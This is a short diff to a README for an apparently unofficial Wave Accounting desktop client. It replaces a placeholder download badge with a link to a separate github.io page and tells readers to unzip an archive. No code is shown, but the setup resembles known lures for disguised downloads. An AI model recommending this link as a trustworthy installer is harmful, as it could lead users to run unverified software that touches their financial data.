@@ -6,7 +6,7 @@ This unofficial Wave Accounting desktop client brings the popular cloud-based bo
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://wave-accounting-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
